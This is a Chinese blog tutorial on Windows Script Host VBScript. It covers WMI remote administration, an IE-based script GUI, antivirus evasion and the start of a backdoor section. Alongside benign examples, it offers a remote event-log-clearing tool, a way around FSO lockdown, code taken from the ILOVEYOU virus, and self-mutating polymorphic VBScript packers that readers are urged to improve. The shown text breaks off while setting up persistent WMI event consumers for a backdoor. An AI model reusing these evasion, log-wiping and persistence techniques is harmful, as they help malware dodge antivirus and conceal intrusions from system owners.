[http://blog.csdn.net/iiprogram/article/details/672580](http://blog.csdn.net/iiprogram/article/details/672580)

# 【目录】 #
- 1，前言
- 2，回顾WSH对象
- 3，WMI服务
- 4，脚本也有GUI
- 5，反查杀
- 6，来做个后门
- 7，结语
- 8，参考资料

# 【前言】 #
本文讲述一些Windows脚本编程的知识和技巧。这里的Windows脚本是指"Windows Script Host"(WSH Windows脚本宿主)，而不是HTML或ASP中的脚本。前者由Wscript或Cscript解释，后两者分别由IE和IIS负责解释。描述的语言是VBScript。本文假设读者有一定的Windows脚本编程的基础。如果你对此还不了解，请先学习《Windows脚本技术》[1]。

# 【回顾WSH对象】 #
得益于com技术的支持，WSH能提供比批处理(.bat)更强大的功能。说白了，wsh不过是调用现成的“控件”作为一个对象，用对象的属性和方法实现目的。

常用的对象有：

WScript

Windows脚本宿主对象模型的根对象，要使用WSH自然离不开它。它提供多个子对象，比如WScript.Arguments和WScript.Shell。前者提供对整个命令行参数集的访问，后者可以运行程序、操纵注册表内容、创建快捷方式或访问系统文件夹。

Scripting.FileSystemObject

主要为IIS设计的对象，访问文件系统。这个恐怕是大家遇到最多的对象了，因为几乎所有的Windows脚本病毒都要通过它复制自己感染别人。

ADODB.Stream

ActiveX Data Objects数据库的子对象，提供流方式访问文件的功能。这虽然属于数据库的一部分，但感谢微软，ADO是系统自带的。

Microsoft.XMLHTTP

为支持XML而设计的对象，通过http协议访问网络。常用于跨站脚本执行漏洞和SQL injection。

还有很多不常见的：

活动目录服务接口(ADSI)相关对象 —— 功能涉及范围很广，主要用于Windows域管理。
InternetExplorer对象 —— 做IE能做的各种事。

Word，Excel，Outlook对象 —— 用来处理word文档，excel表单和邮件。

WBEM对象 —— WBEM即Web-Based Enterprise Management。它为管理Windows提供强大的功能支持。下一节提到的WMI服务提供该对象的接口。

很显然，WSH可以利用的对象远远不止这些。本文挂一漏万，谈一些较实用的对象及其用法。
先看一个支持断点续传下载web资源的例子，它用到了上面说的4个常用对象。
	
	if (lcase(right(wscript.fullname,11))="wscript.exe") then '判断脚本宿主的名称'
		die("Script host must be CScript.exe.") '脚本宿主不是CScript，于是就die了'
	end if
	
	if wscript.arguments.count<1 then '至少要有一个参数'
		die("Usage: cscript webdl.vbs url [filename]") '麻雀虽小五脏俱全，Usage不能忘'
	end if
	
	url=wscript.arguments(0) '参数数组下标从0开始'
	if url="" then die("URL can't be null.") '敢唬我，空url可不行'

	if wscript.arguments.count>1 then '先判断参数个数是否大于1'
		filename=wscript.arguments(1) '再访问第二个参数'
	else '如果没有给出文件名，就从url中获得'
		t=instrrev(url,"/") '获得最后一个"/"的位置'
		if t=0 or t=len(url) then die("Can not get filename to save.") '没有"/"或以"/"结尾'
		filename=right(url,len(url)-t) '获得要保存的文件名'
	end if

	if not left(url,7)="http://" then url=&qu ... t;&url '如果粗心把“http://”忘了，加上&#39;
	
	set fso=wscript.createobject("Scripting.FileSystemObject") 'FSO，ASO，HTTP三个对象一个都不能少'
	set aso=wscript.createobject("ADODB.Stream")
	set http=wscript.createobject("Microsoft.XMLHTTP")
	
	if fso.fileexists(filename) then '判断要下载的文件是否已经存在'
		start=fso.getfile(filename).size '存在，以当前文件大小作为开始位置'
	else
		start=0 '不存在，一切从零开始'
		fso.createtextfile(filename).close '新建文件'
	end if
	
	wscript.stdout.write "Connectting..." '好戏刚刚开始'
	current=start '当前位置即开始位置'

	do
		http.open "GET",url,true '这里用异步方式调用HTTP'
		http.setrequestheader "Range","bytes="&start&"-"&cstr(start+20480) '断点续传的奥秘就在这里'
		http.setrequestheader "Content-Type:","application/octet-stream"
		http.send '构造完数据包就开始发送'
	
		for i=1 to 120 '循环等待'
			if http.readystate=3 then showplan() '状态3表示开始接收数据，显示进度'
			if http.readystate=4 then exit for '状态4表示数据接受完成'
			wscript.sleep 500 '等待500ms'
		next
	
		if not http.readystate=4 then die("Timeout.") '1分钟还没下完20k？超时！'
		if http.status>299 then die("Error: "&http.status&" "&http.statustext) '不是吧，又出错？'
		if not http.status=206 then die("Server Not Support Partial Content.") '服务器不支持断点续传'
		
		aso.type=1 '数据流类型设为字节'
		aso.open
		aso.loadfromfile filename '打开文件'
		aso.position=start '设置文件指针初始位置'
		aso.write http.responsebody '写入数据'
		aso.savetofile filename,2 '覆盖保存'
		aso.close
		
		range=http.getresponseheader("Content-Range") '获得http头中的"Content-Range"'
		if range="" then die("Can not get range.") '没有它就不知道下载完了没有'
		temp=mid(range,instr(range,"-")+1) 'Content-Range是类似123-456/789的样子'
		current=clng(left(temp,instr(temp,"/")-1)) '123是开始位置，456是结束位置'
		total=clng(mid(temp,instr(temp,"/")+1)) '789是文件总字节数'
		if total-current=1 then exit do '结束位置比总大小少1就表示传输完成了'
		start=start+20480 '否则再下载20k'
	loop while true
	
	wscript.echo chr(13)&"Download ("&total&") Done." '下载完了，显示总字节数'
	
	function die(msg) '函数名来自Perl内置函数die'
		wscript.echo msg '交代遗言^_^'
		wscript.quit '去见马克思了'
	end function
	
	function showplan() '显示下载进度'
		if i mod 3 = 0 then c="/" '简单的动态效果'
		if i mod 3 = 1 then c="-"
		if i mod 3 = 2 then c="/"
		wscript.stdout.write chr(13)&"Download ("&current&") "&c&chr(8)'13号ASCII码是回到行首，8号是退格'
	end function

可以看到，http控件的功能是很强大的。通过对http头的操作，很容易就实现断点续传。例子中只是单线程的，事实上由于http控件支持异步调用和事件，也可以实现多线程下载。在MSDN里有详细的用法。至于断点续传的详细资料，请看RFC2616。

FSO和ASO都可以访问文件，他们有什么区别呢？其实，ASO除了在访问字节（非文本）数据有用外，就没有存在的必要了。如果想把例子中的ASO用FSO来实现，那么写入http.responsebody的时候会出错。反之也不行，ASO无法判断文件是否存在。如果文件不存在，loadfromfile就直接出错，没有改正的机会。当然，可以用on error resume next语句让脚本宿主忽略非致命错误，自己捕捉并处理。但有现成的fileexists()为什么不用呢？

另外，由于FSO经常被脚本病毒和ASP木马利用，所以管理员可能会在注册表中修改该控件的信息，使脚本无法创建FSO。其实执行一个命令regsvr32 /s scrrun.dll就恢复了。即使scrrun.dll被删除，自己复制一个过去就行。

热身完之后，下面我们来看一个功能强大的对象——WBEM（由WMI提供）。

# 【WMI服务】 #
先看看MSDN里是怎么描述WMI的——Windows 管理规范 (WMI) 是可伸缩的系统管理结构，它采用一个统一的、基于标准的、可扩展的面向对象接口。我在刚开始理解WMI的时候，总以为WMI是"Windows管理接口"(Interface)，呵呵。

再看什么是WMI服务——提供共同的界面和对象模式以便访问有关操作系统、设备、应用程序和服务的管理信息。如果此服务被终止，多数基于Windows的软件将无法正常运行。如果此服务被禁用，任何依赖它的服务将无法启动。

看上去似乎是个很重要的服务。不过，默认情况下并没有服务依赖它，反而是它要依赖RPC和EventLog服务。但它又是时常用到的。我把WMI服务设置为手动启动并停止，使用电脑一段时间，发现WMI服务又启动了。被需要就启动，这是服务设置为“手动”的特点。当我知道WMI提供的管理信息有多庞大后，对WMI服务的自启动就不感到奇怪了。

想直观了解WMI的复杂，可以使用WMITools.exe[2]这个工具。这是一个工具集。使用其中的WMI Object Browser可以看到很多WMI提供的对象，其复杂程度不亚于注册表。更重要的是，WMI还提供动态信息，比如当前进程、服务、用户等。

WMI的逻辑结构是这样的：

首先是WMI使用者，比如脚本（确切的说是脚本宿主）和其他用到WMI接口的应用程序。由WMI使用者访问CIM对象管理器WinMgmt（即WMI服务），后者再访问CIM(公共信息模型Common Information Model)储存库。静态或动态的信息（对象的属性）就保存在CIM库中，同时还存有对象的方法。一些操作，比如启动一个服务，通过执行对象的方法实现。这实际上是通过COM技术调用了各种dll。最后由dll中封装的API完成请求。

WMI是事件驱动的，操作系统、服务、应用程序、设备驱动程序等都可作为事件源，通过COM接口生成事件通知。WinMgmt捕捉到事件，然后刷新CIM库中的动态信息。这也是为什么WMI服务依赖EventLog的原因。

说完概念，我们来看看具体如何操作WMI接口。
下面这个例子的代码来自我写的脚本RTCS。它是远程配置telnet服务的脚本。
这里只列出关键的部分：

首先是创建对象并连接服务器：

	set objlocator=createobject("wbemscripting.swbemlocator")
	set objswbemservices=objlocator.connectserver(ipaddress,"root/default",username,password)

第一句创建一个服务定位对象，然后第二句用该对象的connectserver方法连接服务器。
除了IP地址、用户名、密码外，还有一个名字空间参数root/default。
就像注册表有根键一样，CIM库也是分类的。用面向对象的术语来描述就叫做“名字空间”(Name Space)。

由于RTCS要处理NTLM认证方式和telnet服务端口，所以需要访问注册表。而操作注册表的对象在root/default。

	set objinstance=objswbemservices.get("stdregprov") '实例化stdregprov对象'
	set objmethod=objinstance.methods_("SetDWORDvalue") 'SetDWORDvalue方法本身也是对象'
	set objinparam=objmethod.inparameters.spawninstance_() '实例化输入参数对象'
	objinparam.hdefkey=&h80000002 '根目录是HKLM，代码80000002(16进制)'
	objinparam.ssubkeyname="SOFTWARE/Microsoft/TelnetServer/1.0" '设置子键'
	objinparam.svaluename="NTLM" '设置键值名'
	objinparam.uvalue=ntlm '设置键值内容，ntlm是变量，由用户输入参数决定'
	set objoutparam=objinstance.execmethod_("SetDWORDvalue",objinparam) '执行方法'

然后设置端口

	objinparam.svaluename="TelnetPort"
	objinparam.uvalue=port 'port也是由用户输入的参数'
	set objoutparam=objinstance.execmethod_("SetDWORDvalue",objinparam)

看到这里你是不是觉得有些头大了呢？又是名字空间，又是类的实例化。我在刚开始学习WMI的时候也觉得很不习惯。记得我的初中老师说过，读书要先把书读厚，再把书读薄。读厚是因为加入了自己的想法，读薄是因为把握要领了。
我们现在就把书读薄。上面的代码可以改为：

	set olct=createobject("wbemscripting.swbemlocator")
	set oreg=olct.connectserver(ip,"root/default",user,pass).get("stdregprov")
	HKLM=&h80000002
	out=oreg.setdwordvalue(HKLM,"SOFTWARE/Microsoft/TelnetServer/1.0","NTLM",ntlm)
	out=oreg.setdwordvalue(HKLM,"SOFTWARE/Microsoft/TelnetServer/1.0","TelnetPort",port)

现在是不是简单多了？

接着是对telnet服务状态的控制。

	set objswbemservices=objlocator.connectserver(ipaddress,"root/cimv2",username,password)
	set colinstances=objswbemservices.execquery("select * from win32_service where name='tlntsvr'")

这次连接的是root/cimv2名字空间。然后采用wql(sql for WMI)搜索tlntsvr服务。熟悉sql语法的一看就知道是在做什么了。这样得到的是一组Win32_Service实例，虽然where语句决定了该组总是只有一个成员。

为简单起见，假设只要切换服务状态。

	for each objinstance in colinstances
		if objinstance.started=true then '根据started属性判断服务是否已经启动'
			intstatus=objinstance.stopservice() '是，调用stopservice停止服务'
		else
			intstatus=objinstance.startservice() '否，调用startservice启动服务'
		end if
	next

关键的代码就是这些了，其余都是处理输入输出和容错的代码。

总结一下过程：

- 1，连接服务器和合适的名字空间。
- 2，用get或execquery方法获得所需对象的一个或一组实例。
- 3，读写对象的属性，调用对象的方法。

那么，如何知道要连接哪个名字空间，获得哪些对象呢？《WMI技术指南》[3]中分类列出了大量常用的对象。可惜它没有相应的电子书，你只有到书店里找它了。你也可以用WMITools里WMI CIM Studio这个工具的搜索功能，很容易就能找想要的对象。找到对象后，WMI CIM Studio能列出其属性和方法，然后到MSDN里找具体的帮助。而应用举例，除了我写的7个RS系列脚本，还有参考资料[4]。

需要特别说明的是，在参考资料[4]中，连接服务器和名字空间用的是类似如下的语法：

	Set objWMIService=GetObject("winmgmts:{impersonationLevel=impersonate}!//"&strComputer&"/root/cimv2:Win32_Process")

详细的语法在《WMI技术指南》和MSDN中有介绍，但我们不关心它，因为这种办法没有用户名和密码参数。 因此，只有在当前用户在目标系统（含本地）有登陆权限的情况下才能使用。而connectserver如果要本地使用，第一个参数可以是127.0.0.1或者一个点"."，第3、4个参数都是空字符串""。

最后，访问WMI还有一个“特权”的问题。如果你看过ROTS的代码，你会发现有两句“奇怪”的语句：

	objswbemservices.security_.privileges.add 23,true
	objswbemservices.security_.privileges.add 18,true

这是在向WMI服务申请权限。18和23都是权限代号。下面列出一些重要的代号：

- 5 在域中创建帐户
- 7 管理审计并查看、保存和清理安全日志
- 9 加载和卸载设备驱动
- 10 记录系统时间
- 11 改变系统时间
- 18 在本地关机
- 22 绕过历遍检查
- 23 允许远程关机

详细信息还是请看《WMI技术指南》或MSDN。

所有特权默认是没有的。我在写RCAS时，因为忘了申请特权11，结果一直测试失败，很久才找到原因。

只要有权限连接WMI服务，总能成功申请到需要的特权。这种特权机制，只是为了约束应用程序的行为，加强系统稳定性。有点奇怪的是，访问注册表却不用申请任何特权。真不知道微软的开发人员是怎么想的，可能是访问注册表太普遍了。

【脚本也有GUI】
虽然系统提供了WScript和CScript两个脚本宿主，分别负责窗口环境和命令行环境下的脚本运行，但实际上窗口环境下用户与脚本交互不太方便：参数输入只能建立快捷方式或弹出InputBox对话框，输出信息后只有在用户“确定”后才能继续运行。完全没有了窗口环境直观、快捷的优势。好在有前面提到的InternetExplorer对象，脚本可以提供web风格的GUI。

还是来看个例子，一个清除系统日志的脚本，顺便复习一下WMI：

	set ie=wscript.createobject("internetexplorer.application","event_") '创建ie对象'
	ie.menubar=0 '取消菜单栏'
	ie.addressbar=0 '取消地址栏'
	ie.toolbar=0 '取消工具栏'
	ie.statusbar=0 '取消状态栏'
	ie.width=400 '宽400'
	ie.height=400 '高400'
	ie.resizable=0 '不允许用户改变窗口大小'
	ie.navigate "about:blank" '打开空白页面'
	ie.left=fix((ie.document.parentwindow.screen.availwidth-ie.width)/2) '水平居中'
	ie.top=fix((ie.document.parentwindow.screen.availheight-ie.height)/2) '垂直居中'
	ie.visible=1 '窗口可见'
	
	with ie.document '以下调用document.write方法，'
		.write "<html><body bgcolor=#dddddd scroll=no>" '写一段html到ie窗口中。'
		.write "<h2 align=center>远程清除系统日志</h2><br>"
		.write "<p>目标IP：<input id=ip type=text size=15>" '也可以用navigate方法直接打开一'
		.write "<p>用户名：<input id=user type=text size=30>" '个html文件，效果是一样的。'
		.write "<p>密码：　<input id=pass type=password size=30>"
		.write "<p align=center>类型：" '不仅是input对象，所有DHTML支持'
		.write "<input id=app type=checkbox>应用程序 " '的对象及其属性、方法都可以使用。'
		.write "<input id=sys type=checkbox>系统 "
		.write "<input id=sec type=checkbox>安全" '访问这些对象的办法和网页中访问'
		.write "<p align=center><br>" '框架内对象是类似的。'
		.write "<input id=confirm type=button value=确定> "
		.write "<input id=cancel type=button value=取消>"
		.write "</body></html>"
	end with
	
	dim wmi '显式定义一个全局变量'
	set wnd=ie.document.parentwindow '设置wnd为窗口对象'
	set id=ie.document.all '设置id为document中全部对象的集合'
	id.confirm.onclick=getref("confirm") '设置点击"确定"按钮时的处理函数'
	id.cancel.onclick=getref("cancel") '设置点击"取消"按钮时的处理函数'
	
	do while true '由于ie对象支持事件，所以相应的，'
		wscript.sleep 200 '脚本以无限循环来等待各种事件。'
	loop
	
	sub event_onquit 'ie退出事件处理过程'
		wscript.quit '当ie退出时，脚本也退出'
	end sub
	
	sub cancel '"取消"事件处理过程'
		ie.quit '调用ie的quit方法，关闭IE窗口'
	end sub '随后会触发event_onquit，于是脚本也退出了'
	
	sub confirm '"确定"事件处理过程，这是关键'
		with id
			if .ip.value="" then .ip.value="." '空ip值则默认是对本地操作'
			if not (.app.checked or .sys.checked or .sec.checked) then 'app等都是checkbox，通过检测其checked'
				wnd.alert("至少选择一种日志") '属性，来判断是否被选中。'
				exit sub
			end if

			set lct=createobject("wbemscripting.swbemlocator") '创建服务器定位对象'
			on error resume next '使脚本宿主忽略非致命错误'
			set wmi=lct.connectserver(.ip.value,"root/cimv2",.user.value,.pass.value) '连接到root/cimv2名字空间'
			if err.number then '自己捕捉错误并处理'
				wnd.alert("连接WMI服务器失败") '这里只是简单的显示“失败”'
				err.clear
				on error goto 0 '仍然让脚本宿主处理全部错误'
				exit sub
			end if

			if .app.checked then clearlog "application" '清除每种选中的日志'
			if .sys.checked then clearlog "system"
			if .sec.checked then clearlog "security" '注意，在XP下有限制，不能清除安全日志'
			wnd.alert("日志已清除")
		end with
	end sub
	
	sub clearlog(name)
		wql="select * from Win32_NTEventLogFile where logfilename='"&name&"'"
		set logs=wmi.execquery(wql) '注意，logs的成员不是每条日志，'

		for each l in logs '而是指定日志的文件对象。'
			if l.cleareventlog() then
				wnd.alert("清除日志"&name&"时出错！")
				ie.quit
				wscript.quit
			end if
		next
	end sub


总结一下整个过程。首先是创建internetexplorer.application对象。其直接的效果是启动了一个iexplorer进程，但窗口是不可见的，直到设置了ie.visible=1。然后用document.write方法将html语句写到ie窗口中。对于复杂的界面，可以将html代码保存为一个html文件，用ie.navigate(filename)打开。最后是响应窗口中的输入。这基本上属于DHTML的知识范畴。

与一般脚本编程最大的不同之处，在于ie是事件驱动的。你所要做的，就是设置好相应的事件处理函数/过程。

在本例中，脚本只关心3个事件：ie退出，"确定"按钮被点击，"取消"按钮被点击。

注意，例子中只有两句设置事件处理过程的语句，没有定义ie退出事件与event_onquit过程关联。这是因为这里用到一个特性——创建ie对象时的第二个参数"event_"是一个前缀，ie对象的事件处理过程名是该前缀加事件名。所以onquit事件的处理过程默认就是event_onquit。

当点击"确定"按钮后，confirm过程被调用。例子中演示了如何访问ie中的对象，比如ie.document.all.ip.value就是在"目标IP"文本框中的输入。如果选中"应用程序"这个checkbox，那么ie.document.all.app.checked的值是true，否则是false。想调用alert方法，则用ie.document.parentwindow.alert。其他各种ie内对象的访问方法完全是类似的。具体的可以看DHTML相关资料。

有了web界面，交互就变得丰富多彩了。大家可以充分发挥创意。

比如，很多GUI工具(比如流光)启动时，有一个logo页，显示版权等信息。我们用ie对象也可以模拟一个出来：

	set ie=wscript.createobject("internetexplorer.application")
	ie.fullscreen=1
	ie.width=300
	ie.height=150
	ie.navigate "about:blank"
	ie.left=fix((ie.document.parentwindow.screen.availwidth-ie.width)/2)
	ie.top=fix((ie.document.parentwindow.screen.availheight-ie.height)/2)
	ie.document.write "<body bgcolor =skyblue scroll=no><br><br>"&_
	"<h2 align=center>这是一个Logo</h2></body>"
	ie.visible=1
	wscript.sleep 5000
	ie.quit

上面这段代码执行后，将在屏幕中央显示一个连标题栏和边框都没有的ie窗口，持续5秒。
窗口里是蓝底黑字的“这是一个Logo”。

脚本GUI化之后，与用户的交互更直观。像Nmap那样有很多参数的工具，在本地使用时，写一个图形界面的“接口”就一劳永逸了。输出的结果也可以用脚本处理，以更适合阅读的方式显示，就像流光等工具能生成html扫描报告那样。
# 
【反查杀】 #
首先必须说明的是，我完全没有试图挑战杀毒软件杀毒能力的意思。Windows脚本是一种解释性语言，明文保存代码。由于没有经过编译过程，代码的复杂程度远不如可执行程序(exe)。exe做不到的事，没理由指望脚本能做到。不过，正因为脚本的反查杀能力很差，以至于杀毒软件使用的查杀办法也不高级。于是我们就有机可乘了。

先看看常见的反查杀办法：

## 1，字符串或语句的分割/重组。 ##
最典型的例子就是将 fso=createobject("scripting.filesystemobject")

变成 fso=createobject("script"+"ing.filesyste"+"mobject")

这种办法的扩展是用execute语句：
execute("fso=crea"+"teobject(""scr"+"ipting.filesy"+"stemobject"")")

## 2，变量名自动改变。 ##

	Randomize
	Set Of = CreateObject("Scripting.FileSystemObject")
	vC = Of.OpenTextFile(WScript.ScriptFullName, 1).Readall
	fS = Array("Of", "vC", "fS", "fSC")
	For fSC = 0 To 3
		vC = Replace(vC, fS(fSC), Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)))
	Next
	Of.OpenTextFile(WScript.ScriptFullName, 2, 1).Writeline vC

上面这段代码取自爱虫病毒，大家运行一下，就知道是怎么回事了。

## 3，用官方工具——脚本编码器screnc.exe[5]加密脚本。 ##
加密后的脚本能被脚本宿主直接解释。本来这是最好的解决办法，但“枪打出头鸟”，由于加密是可逆的，现在所有的杀毒软件都有解码功能。因此这个办法的效果基本上为零。

第一个办法的有效告诉我们这样一个事实：对脚本病毒的查杀基本上是属于静态的。而且，我发现即使只是改变大小写，也能起到反查效果(只试了一种杀毒软件)。反查杀的关键是减少特征码。

对于exe的反查杀，最容易想到的就是“加壳”。在脚本上也可以应用这个办法。比如：

	str="cswpire.tohcO"" ""!K"
	for i=1 to len(str) step 3
		rev=rev+strreverse(mid(str,i,3))
	next
	execute rev

一个最简单的“壳”。“壳”的算法是每n个字符反转顺序一次。n就是算法的“种子”，本例中它等于3。

这个“壳”是死的，起不到减少特征码的效果。反而增加了特征码，如"cswpire"。

下面看一个复杂些的例子：

	str="wscript.echo ""OK!"":randomize:key=int(rnd*8+2):str=rev:str=replace(str,chr(34),chr(34)+chr(34)):set aso=createobject(""ADODB.Stream""):with aso:.open:.writetext ""str=""+chr(34)+str+chr(34)+"":key=""+cstr(key)+"":str=rev:execute str:function rev():for i=1 to len(str) step key:rev=rev+strreverse(mid(str,i,key)):next:end function"":.savetofile wscript.scriptfullname,2:end with":key=1:str=rev:execute str:function rev():for i=1 to len(str) step key:rev=rev+strreverse(mid(str,i,key)):next:end function

（注意，该代码只有一行，没有回车）
保存成vbs文件，双击执行，效果还是和前一段代码一样，弹出一个对话框显示"OK!"。
但是，执行完后再看代码，可能变成了这样：

	str="tpircsw"" ohce.ar:""!KOezimodnni=yek:8*dnr(trts:)2+ts:ver=alper=r,rts(ec)43(rhc43(rhc,3(rhc+)tes:))4rc=osa jboetaeDA""(tcertS.BDOw:)""maeosa hti:nepo.:tetirw.ts"" txerhc+""=rts+)43(3(rhc+rek:""+)4tsc+""=y+)yek(rr=rts:""cexe:verts etuitcnuf:(ver noi rof:)l ot 1=)rts(nek pets =ver:yerts+veresreverts(dim(yek,i,rtxen:))uf dne:""noitcntevas.:w elifo.tpircsftpircsemanllu dne:2,htiw":key=7:str=rev:execute str:function rev():for i=1 to len(str) step key:rev=rev+strreverse(mid(str,i,key)):next:end function

再执行，又变成其他样子了。这个脚本是自变形的。

如果仔细看代码就会发现，“壳”的算法依旧，而“种子”随机改变。但是，加壳过的内容每次不同了，“壳”本身还是没有任何改变。很多exe加壳工具加的壳，本身就被当作恶意代码来提取特征码。为了更好的反查杀，脚本的“壳”也需要动态改变。这就要用到所谓的多态技术。不过，exe的多态是用来反动态查杀的，而脚本的“多态”只是应付静态查杀，两者有很大不同。

对于exe，真正的多态目前还未听说被实现的。脚本也只能做多少算多少。

不影响功能的变形方法，除了上面提到的3种，还有：

- 1，随机改变大小写；
- 2，冒号(:)与回车符随机互换（字符串内和"then"之后的冒号除外）；
- 3，字符串分割时，"+"与"&"随机互换；
- 4，()+-*/&,等字符两边任意添加空格或续行符(_)和回车符的组合；
- 5，用自定义函数替换内置函数；即使自定义的函数只是简单的封装内置函数，但至少改变了关键字的位置。
…………
还有其他“多态”算法有待你的研究。

这些算法的应用，是以大幅增加代码长度为前提的。如果想写一个比较完美的“壳”，相信会涉及到“文法分析”的知识，因为脚本要“读懂”自己，从而达到类似Java混淆器的效果，这就很复杂了，有机会再和大家探讨。下面我们应用“语句分割”、“变量名自动改变”、“随机大小写”、“+和&互换”四种方法，看一下效果如何：

	A001="wscript.echo ""OK!"":A004=chr(34):randomize:A005=int(rnd*24000+40960):A001=A006(A001):A000=A005 mod 10+2:A001=replace(A002,A004,A004&A004):set A007=createobject(""ADODB.Stream""):A007.open:A007.writetext hex(A005+1)&""=""&A004&A001&A004&A008("":execute ""&A004&A006(""A000=""&A000&"":A001=A002:execute A001:function A002():for A003=1 to len(A001) step A000:A002=A002+strreverse(mid(A001,A003,A000)):next:end function"")&A004):A007.savetofile wscript.scriptfullname,2:function A006(A009):for A00A=0 to 12:A009=replace(A009,hex(&HA000+A00A),hex(A005+A00A)):next:A006=A009:end function:function A008(A009):for A00A=1 to len(A009):A00B=mid(A009,A00A,1):if int(rnd*2-1) then A00B=ucase(A00B):end if:if A00A>11 and int(rnd*5)=0 then A008=A008&A004&chr(38+int(rnd*2)*5)&A004:end if:A008=A008&A00B:next:end function":A000=1:A001=A002:execute A001:function A002():for A003=1 to len(A001) step A000:A002=A002+strreverse(mid(A001,A003,A000)):next:end function

（注意，其中没有回车符）

上面是“原版”的，保存为vbs文件双击运行，还是弹出对话框显示"OK!"。再看代码变形成什么样了(效果是随机的)：

	B906="tpircsw"" ohce.9B:""!KO(rhc=90nar:)43:ezimodni=A09B2*dnr(t04+00049B:)069B09B=60:)609B(9B=509B dom A09B:2+01lper=6009B(eca,909B,79B&909Btes:)90c=C09B boetaerA""(tcejtS.BDOD:)""maerpo.C09BC09B:netetirw.xeh txe1+A09B(B&""=""&)09B&909&909B&6:""(D09Betucexe909B&"" ""(B09B&&""=509B:""&509B9B=609Bcexe:709B etucnuf:609B noitof:)(70=809B rel ot 1)609B(nB pets 09B:509+709B=7everrtsdim(esrB,609B(09B,809xen:))5f dne:tnoitcnu909B&)"".C09B:)fotevascsw elics.tpirluftpir2,emanlitcnuf:B09B no:)E09B(09B rof ot 0=FE09B:21calper=,E09B(eBH&(xeh09B+509(xeh,)F9B+A09Ben:))F0B09B:txe:E09B=cnuf dnuf:noit noitcn9B(D09Brof:)E01=F09B nel ot :)E09B(im=019B,E09B(d)1,F09Btni fi:-2*dnr(neht )1u=019B 9B(esacdne:)01 fi:fi 11>F09Bni dna 5*dnr(teht 0=)=D09B n9B&D09B(rhc&90(tni+83*)2*dnr909B&)5fi dne:B=D09B:19B&D09:txen:0nuf dnenoitc":EXecUTe "B9"&"05=7"&":B906"&"=B907:E"+"XEc"+"utE B906"+":FuN"&"ctIoN B9"&"07():fOr"+" B9"+"08=1 tO l"&"En(B906)"+" step B905:B907"&"=B907+"&"sTRreVErSe(MId("&"B9"&"0"&"6,B908,B905"&")"+"):N"+"eX"+"t"+":eNd fUN"&"CtiOn"

眼花了没？再来一次：

	F0CB="rcsw.tpiohceKO"" F:""!=EC0(rhc:)43dnarzimo0F:ei=FCr(tn2*dn0004904+:)06BC0FD0F=0F(0:)BCAC0FC0F=om F01 dF:2+=BC0lper(ecaCC0FC0F,0F,EF&EC)EC0tes:D0F rc=1etaeejbo""(tcDODAtS.BmaerF:)"".1D0nepoD0F:rw.1teti txe(xehFC0F&)1+&""=""EC0FC0F&0F&BF&EC(2D0xe:""tuce&"" eEC0FD0F&F""(0=AC00F&""""&ACC0F:0F=Be:CCucex etBC0Fnuf:oitc0F n)(CCrof:C0F 1=Dl otF(ne)BC0ets 0F pF:AC=CC0CC0Frts+ever(esr(dimBC0FC0F,0F,D))ACxen:ne:tuf ditcn)""noC0F&F:)E.1D0evasifotw elircss.tppircluftmanl:2,ecnufnoitD0F 0F(0:)3D rof4D0Ft 0=21 oD0F:er=3calp0F(eh,3D&(xeC0FH0F+A,)4D(xehFC0FD0F+:))4txenD0F:0F=0e:3Df dntcnu:noicnufnoitD0F 0F(2:)3D rof4D0Ft 1=el o0F(n:)3D5D0Fdim=D0F(0F,31,4Dfi:)tni dnr(1-2*ht )F ne=5D0sacu0F(e:)5D dnei:fi0F f1>4Dna 1ni dnr(t)5*dt 0= neh2D0FD0F=0F&2c&EC3(rhni+8nr(t)2*d&)5*EC0Fdne::fi 2D0FD0F=0F&2n:5D:txe dnecnufnoit":eXecUtE "F"+"0CA"&"=4:F0CB"+"="+"F0CC:eX"+"e"+"cUte F0CB"&":F"+"UNC"+"tIOn F0CC():F"+"or"+" F0"&"CD=1 tO LEN(F0CB) sTEp F0CA:F0CC=F0CC+strR"+"Ever"+"SE"&"(mID("+"F0CB,"+"F0CD,F0CA)):nEXT:eNd FU"&"nCTIo"&"N"

这样够了吗？——不知道。也许杀毒引擎本来就是忽略大小写的，本来就能自动连接字符串，本来就能“文法分析”……

这个“壳”有实用性吗？——没有。因为“壳”的算法太简单。“种子”A000 = A005 mod 10 + 2，所以如果不考虑自动改变的变量名，加壳后的代码只有10种样子。

如何改进这个“壳”？——当然是用更复杂的算法，更多的“多态”。

如果你有兴趣，可以先看那个“原版”的脚本代码（把冒号都替换为回车，可读性就比较好了），然后自己加强它。

当然，你也可以另起炉灶，自由展现你的创意。
# 
【来做个后门】 #
在讨论脚本后门前，先要介绍一类很有用的WMI对象。事实上，这才是本节的关键。脚本后门不过是它的一个应用而已。

前面已经说过，WMI是事件驱动的。整个事件处理机制分为四个部分：

1，事件生产者(provider)：负责产生事件。WMI包含大量的事件生产者。有性能计数器之类的具体的事件生产者，也有类、实例的创建、修改、删除等通用的事件生产者。

2，事件过滤器(filter)：系统每时每刻都在产生大量的事件，通过自定义过滤器，脚本可以捕获感兴趣的事件进行处理。

3，事件消费者(consumer)：负责处理事件。它可以是可执行程序、动态链接库(dll，由WMI服务加载)或者脚本。

4，事件绑定(binding)：通过将过滤器和消费者绑定，明确什么事件由什么消费者负责处理。

事件消费者可以分为临时的和永久的两类。临时的事件消费者只在其运行期间关心特定事件并处理。永久消费者作为类的实例注册在WMI名字空间中，一直有效直到它被注销。显然，永久事件消费者更具实用性。还是来看个例子：

	nslink="winmgmts://./root/cimv2:" '只需要本地连接，所以用这种语法，不用swbemlocator对象'
	
	set asec=getobject(nslink&"ActiveScriptEventConsumer").spawninstance_ '创建“活动脚本事件消费者”'
	asec.name="stopped_spooler_restart_consumer" '定义消费者的名字'
	asec.scriptingengine="vbscript" '定义脚本语言(只能是vbscript)'
	asec.scripttext="getobject(""winmgmts:win32_service='spooler'"").startservice" '脚本代码'
	set asecpath=asec.put_ '注册消费者，返回其链接'
	
	set evtflt=getobject(nslink&"__EventFilter").spawninstance_ '创建事件过滤器'
	evtflt.name="stopped_spooler_filter" '定义过滤器的名字'
	qstr="select * from __instancemodificationevent within 5 " '每5秒查询一次“实例修改事件”'
	qstr=qstr&"where targetinstance isa ""win32_service"" and " '目标实例的类是win32_service'
	qstr=qstr&"targetinstance.name=""spooler"" " '实例名是spooler'
	qstr=qstr&"and targetinstance.state=""stopped""" '实例的state属性是stopped'
	evtflt.query=qstr '定义查询语句'
